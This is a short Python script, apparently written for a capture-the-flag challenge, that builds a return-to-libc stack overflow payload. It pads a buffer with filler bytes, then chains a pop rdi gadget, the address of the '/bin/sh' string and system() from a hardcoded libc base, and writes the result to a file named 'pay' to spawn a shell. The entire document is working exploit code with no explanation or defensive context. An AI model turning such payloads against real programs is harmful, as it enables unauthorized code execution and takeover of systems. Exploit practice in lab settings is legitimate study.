import sys
import struct

libc_base_address = 0x7ffff7800000
libc_base_address = 0x7ffff7800000
ret = libc_base_address + 0x00000000000453a0
pop_rdi = libc_base_address + 0x0000000000021112
bin_sh = libc_base_address + 0x18ce57
#bin_sh = b"cat flag"
sys_fun = libc_base_address + 0x00000000000453a0
exit_fun = libc_base_address + 0xcc790

pay = b"2\n" + b"a" * 31 + b"A" * 88

pay += struct.pack("<Q", pop_rdi)
pay += struct.pack("<Q", bin_sh)
#pay += bin_sh
pay += struct.pack("<Q", sys_fun)
#pay += struct.pack("<Q", exit_fun)

with open("pay", "wb") as f:
    f.write(pay)


